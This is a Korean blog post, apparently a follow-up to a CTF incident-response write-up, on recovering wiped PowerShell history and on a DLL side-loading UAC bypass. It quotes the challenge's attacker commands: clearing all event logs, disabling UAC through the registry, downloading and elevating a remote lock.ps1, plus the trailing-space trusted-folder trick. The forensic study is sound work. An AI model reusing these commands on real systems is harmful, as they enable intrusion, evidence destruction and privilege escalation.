---
layout: post
title: 'FIESTA2024 침해대응 1 추가 정보'
summary: 파워쉘 히스토리 찾기, 문제에서 사용된 DLL Injeciton 기법
author: TouBVa
date: '2025-02-16 21:21:02 +09'
category: ['reversing', 'system_hacking']
thumbnail: /assets/img/posts/2025-02-16-FIESTA2024-cert1-addinfo/image.png
keywords: 리버싱, 윈도우 시스템 해킹, CTF
usemathjax: true
permalink: /blog/reversing/2025-02-02-FIESTA2024-cert1-addinfo
---

* TOC
{:toc}


<br>


부제: 파워쉘 히스토리는 지워도 다 지운 게 아니다

부제 2: dll injeciton 기법 분석

<br>

# 파워쉘 히스토리

<br>

wiping.ps1 파일은 wevutil 유틸리티를 활용해 파워쉘의 히스토리를 지우는 역할을 한다.

```powershell
$filePath = "C:\Users\Public\lock.ps1"

if (Test-Path $filePath) {
    Remove-Item $filePath -Force
}

wevtutil el | foreach { wevtutil cl $_ }
Start-Sleep -Seconds 300
Restart-Computer -Force
```

<br>

따라서, 이벤트 로그로 파워쉘 로그를 확인하려 하면 아래와 같이 오전 10:21:49 이전의  정보가 모두 지워졌음을 확인할 수 있다.

<br>

![image.png](/assets/img/posts/2025-02-16-FIESTA2024-cert1-addinfo/image.png){: width="80%" height="80%"}

그런데 이렇게 유틸리티를 통해 지워진 파워쉘 로그를 다른 곳에서도 찾아볼 수 있다는 점을 알았다.

정확히는 ‘파워쉘 애플리케이션의 지난 실행 데이터’ 이고,

이는 다음 경로에 있다고 한다.

<br>

`"$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"`

(출처: [https://stackoverflow.com/questions/67589348/wheres-the-command-history-in-powershell-ise-stored-at](https://stackoverflow.com/questions/67589348/wheres-the-command-history-in-powershell-ise-stored-at))

현재 환경에서라면 아래와 같은 경로상에 있을 것이다.

`C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`

![image.png](/assets/img/posts/2025-02-16-FIESTA2024-cert1-addinfo/image%201.png){: width="80%" height="80%"}

<br>

```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
function Disable-UAC{`
$regPath="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" Set-ItemProperty -Path $regPath -Name "EnableLUA" -Value 0 -Type DWord`
Set-ItemProperty -Path $regPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord`
}`
Disable-UAC
function Disable-UAC{`
$regPath="HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
Set-ItemProperty -Path $regPath -Name "EnableLUA" -Value 0 -Type DWord`
Set-ItemProperty -Path $regPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord`
}`
Disable-UAC
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/imnothackerkkk/key/main/lock.ps1' -OutFile 'C:\\Users\\Public\\lock.ps1'`
Start-Process 'powershell.exe' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "C:\\Users\\Public\\lock.ps1"' -VerbRunAs -Wait
cd ..
ls
cd .\Users\
cd .\Public\
l
ls
.\lock.ps1
```
<br>

원 포스트에는 쓰지 않았지만, 보안 로그 상에서 UAC 끄는 걸 보고 대충 이전 작업이 있었구나… 했었는데 이렇게 명확히 보게 되니 확실히 속이 시원하다.

그리고 원 포스트에서 해결되지 않았던 궁금증: ‘그래서 lock.ps1은 언제, 뭐가 다운받은 거지?’ 

이게 드디어 해결됐다…..

바꿔치기 되었던 했던 dll상에서 해당 커맨드를 실행했던 것으로 추측된다.

자 그럼 그냥 넘어갈 수 없지

<br>

아래 코드를 기억하는가? 1.exe 의 일부였다.

![image.png](/assets/img/posts/2025-02-16-FIESTA2024-cert1-addinfo/image%202.png){: width="80%" height="80%"}

실제 악성 행위를 하는 DLL을 다운받는 부분이었다.

<br>

# DLL Injection 기법 분석

<br>

이번 문제에서 사용된 DLL Injection은 DLL Side-Loading 기법으로 분류될 수 있다. 

이 기법은 아직도 잘 사용되고 있는 스테디셀러인데, 일례로 2025년 2월 7일 안랩 공식 블로그에 올라온 [‘AhnLab EDR을 활용한 USB로 전파되는 국내 코인마이너 유포 사례 탐지’](https://asec.ahnlab.com/ko/86140/) 포스트에서 다룬 악성코드도 DLL Side-Loading을 활용했을 정도다.

추가로, 이런 DLL Side-Loading 기법에 FXSUNATD.exe가 많이 악용되는 것으로 보인다.

- [UAC 우회 기법(주식회사 쏘마 블로그)](https://tech.somma.kr/UACbypass/)
- [스모크로더 통해 아마데이 봇 변종 확산](https://www.widedaily.com/news/articleView.html?idxno=233027)… UAC 통해 멀웨어 설치한 후 DLL 하이재킹으로 관리자 권한 얻어

<br>

그렇다면 이와 같은 DLL Side-Loading 기법을 활용하는 악성코드가 주로 어떤 동작을 하는지 다시 한 번 간략히 정리해 보자.

1. 정상 파일로 위장한 lnk 파일을 실행하면 악성 명령어 혹은 파일이 실행된다.
2. 실행된 악성 행위는 `“C:\Windows(공백)\System32″`명의 공백 폴더를 생성한다.
    
    ![image.png](/assets/img/posts/2025-02-16-FIESTA2024-cert1-addinfo/image%202.png){: width="80%" height="80%"}
    
3. 이후 추가적인 악성 코드를 생성하고자 한다면 powershell 명령어를 통해 2에서 생성된 `“C:\Windows(공백)\System32″`명의 공백 폴더를 윈도우 디펜더 검사 예외 경로에 등록한다.
4. 추가로, 1에서 실행된 악성 행위는 UAC를 비활성화한다.
    - UAC: 프로그램 실행 전 사용자에게 실행 여부를 묻는 기능으로, 안드로이드에는 비슷하게 Runtime Permission Request 등이 있다.

<br>

위 동작에서 가장 핵심은 2번이다. 윈도우의 UAC를 모두 우회할 수 있도록 해 주는 치명적인 취약점을 악용한 행위이기 때문이다.

이제 DLL Injection/Hijacking/Side-Loading을 기반으로 한 UAC 우회 기법에 대해 알아 보자.

<br>

# DLL Injection/Hijacking/Side-Loading을 기반으로 한 UAC 우회 기법

<br>

주로 참고한 글: [https://tech.somma.kr/UACbypass/](https://tech.somma.kr/UACbypass/)

2018년 이후에 공개된 공격 기법만을 추려 분류하면 아래와 같다.

- 1.파일 시스템 변조
    - 1.1 autoElevate가 설정된 프로그램과 폴더 공백을 이용한 AIS 체크 우회
    - 1.2 일반 사용자도 파일 생성이 가능한 폴더 악용
        - 1.2.1 Windows Server 2019 srrstr.dll
        - 1.2.2 Windows Server 2008R2-2019 NetMan
- 2.레지스트리 변조
    - 2.1 UAC 알람이 발생하지 않는 정상 시스템 파일의 레지스트리 수정
    - 2.2 작업 스케쥴을 이용한 우회
    - 2.3 T1183 Image File Execution Options Injection

2018년 이전에 공개된 공격 기법 중 유명한 권한 상승 기법은 아래와 같다.

- UAC Token Duplication
- MS16-032 취약점
- EditionUpgradeManager COM Interface & 환경변수 스푸핑을 이용한 권한 상승
- WUSA/IFileOperation을 이용한 권한 필요 디렉터리에 DLL 파일 복사
- 등등

<br>

그 중 이번 문제에 사용된 공격 기법은 <mark>2018년 이후에 공개된 공격 기법 > 1.파일 시스템 변조 > 1.1 autoElevate가 설정된 프로그램과 폴더 공백을 이용한 AIS 체크 우회</mark>이다.

<br>

## 파일 실행 시 권한 상승 필요 여부의 판단 조건

<br>

주로 참고한 글: [https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e](https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e)

윈도우에서는 파일을 실행할 때, 이를 실행하는 사용자의 권한 이상의 권한이 필요한지, 즉 파일 실행에 권한 상승이 필요한지 여부를 결정하기 위해 판단을 수행한다. 

해당 판단의 조건은 크게 3가지로, 아래와 같다.

1. 실행 파일의 manifest에 `<autoElevate>true</autoElevate>` 속성이 존재하는가?
    1. 예외적으로, 해당 속성이 존재하지 않더라도 화이트리스팅된 일부 exe 파일에 대해서는 그냥 True 처리가 된다.
        
        예) *‘*cttunesvr.exe’, ‘inetmgr.exe’, ‘migsetup.exe’, ‘mmc.exe’, ‘oobe.exe’, ‘pkgmgr.exe’, ‘provisionshare.exe’, ‘provisionstorage.exe’, ‘spinstall.exe’, ‘winsat.exe’
        
2. 전자서명이 유효한 상태인가?
3. 신뢰할 수 있는 폴더(`C:\Windows\System32` 등)에서 실행되었는가?

<br>

위 3개 조건은 윈도우 UAC의 핵심 컴포넌트 중 하나인 AIS 서비스(appinfo.dll)에 명기된 조건으로, 3개 조건이 모두 and로 참이어야만 UAC Confirm을 거치지 않고 프로그램 실행이 가능하다.

조건 1은 사실상 bypass가 매우 쉽다. 윈도우가 OS에 default로 포함하여 배포하는 응용이라면 거의 무조건 참인 조건이기 때문이다.

그러나 2와 3의 조건을 충족하는 것이 어렵다. 

2의 경우, 악성 행위자가 임의로 서명하여 배포한 응용을 활용할 수가 없다. 제대로 코드 서명을 하려면 정식 CA에서 디지털 인증서를 구매해야 하고, 이 과정에서 공격자의 신원이 드러날 수밖에 없다.

3의 경우, 악성 행위자는 악성 프로그램을 해당 폴더에 임의로 Drop할 수 없다. 애초에 사용자가 실행한 응용이 사용자의 권한으로 실행되는데, 3에서 명기하는 ‘신뢰할 수 있는 폴더’란 시스템 폴더 등으로, 이에 C/U/D를 하려면 관리자 권한이 필요하기 때문이다. 즉, UAC를 하기 위해 UAC가 필요한 모순이 발생한다.

<br>

그러나 여기에 DLL Injection이 끼면 이야기가 달라진다.

조건 1, 2: 굳이 악성 프로그램을 만들어야 하는가? DLL Injection의 대상이 될 적당한 시스템 응용 하나만 고르면 된다.

조건 3: OS상의 취약점을 악용해 공격자가 임의로 생성한 폴더명을 ‘신뢰할 수 있는 폴더명’으로 인식하도록 하면 된다.

<br>

## 폴더 공백을 이용한 UAC-AIS의 체크 우회

<br>

- 일반적으로 윈도우 탐색기에서 폴더 생성 시, 폴더명의 앞 혹은 뒤에 공백을 붙이는 경우 자동으로 trimming되어 폴더가 생성된다.
- 그러나 CreateDirectory API의 취약점을 이용하거나
    - `“\\?\{directory_name_want_to_create}”` 식으로 내가 생성하려는 파일명 앞에 `“\\?\”`를 붙여 CreateDirectory 함수를 콜하면 된다.
        
        ![image.png](/assets/img/posts/2025-02-16-FIESTA2024-cert1-addinfo/image%203.png){: width="80%" height="80%"}
        
- CMD상에서 mkdir를 이용하면 폴더명의 앞 혹은 뒤에 공백을 붙여 폴더 생성이 가능하다.

<br>

AIS에서 세 번째 조건, 즉 신뢰 디렉터리 여부를 판단할 때 사용하는 함수는 `GetLongPathNameW`이다.

이 함수는 폴더 이름의 끝에 공백이 있으면 자동으로 trimming해주는 함수이므로,

사용자가 `“C:\\Windows \\System32”` 를 생성했더라도 `“C:\\Windows\\System32”` 로 인식하게 된다.

즉, 정상 신뢰 디렉터리로 인식하게 된다.

이렇게 생성한 디렉터리에 정상 시스템 응용을 하나 복사해 주고, 해당 시스템 응용이 원격지와 통신할 때 참조하는 dll과 동일한 dll을 악성으로 바꾸어 동일 디렉터리에 넣어준다면

복사된 시스템 응용이 실행될 때 악성 dll도 실행됨으로써 DLL sideloading이 가능해진다.

<br>

악성으로 생성된 폴더명을 sanitizing하는 루틴이 논리적 불일치를 가져 악성 행위가 가능해진다는 점에서 [Nginx-SpringBoot 조합을 사용할 때 가능한 Routing ACL Rules Bypass 취약점](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies#heading-bypassing-nginx-acl-rules-with-spring-boot)이 생각나기도 했다.

<br>

<br>

흠… 조만간 DLL Injeciton에 대해서도 공부해야 할 것 같다.

하면 할수록 모르는 게 너무 많네

당장 생각중인 건,

1. 2024 FIESTA 문제 풀이 모두 올리기
2. 암호화에 주로 사용되는 연산과, 이를 난독화하는 기법 정리
3. DLL Injeciton 기법 이론과 실습
4. Anti-Debugging 우회 기법 이론과 실습

정도인데….

2025년 중에 이걸 다 할 수 있을까?

대학원을 다니면서?

업무를 하면서?

아악 모르겠다

그런데 항상 알고 싶었던 거고 궁금한 거라 할 것 같기도 함 ㅋㅋ